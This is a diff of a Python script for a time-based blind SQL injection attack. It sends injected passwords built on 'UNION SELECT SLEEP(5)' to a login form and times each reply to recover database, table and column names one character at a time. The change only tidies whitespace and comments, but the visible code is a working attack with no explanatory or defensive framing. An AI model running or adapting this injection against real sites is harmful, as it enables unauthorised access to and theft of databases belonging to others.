@@ -29,14 +29,12 @@ def db_name():
  
     print(table)
 
-
-
     for i in range(1, 20):
         for j in range(0, len(dictionary)):
             usr = "idc"
             passwd = "' UNION SELECT SLEEP(5)" + table + " where database() like '" + texte + dictionary[j] + "%' -- "
-
             print(passwd)
+
             start_time = time.time()
             response = requests.post(url, data={'username': usr, 'password': passwd})
             end_time = time.time()
@@ -101,8 +99,6 @@ def table_name(database):
             response = requests.post(url, data={'username': usr, 'password': passwd})
             end_time = time.time()
             total_time = end_time - start_time
-            """print(total_time)
-            print(dictionary[j])"""
             a += 1
             print(texte)
             print(tables_name)
@@ -128,11 +124,6 @@ def table_name(database):
     jsp2 = final_db + "".join(tables_name[c-1])
     print(jsp2)
     return jsp2
-
-    """ fonctionne 
-    final_name = "".join(tables_name[b-1])
-    print(final_name)"""
-
 
 
 def column_name(database, nom_table):
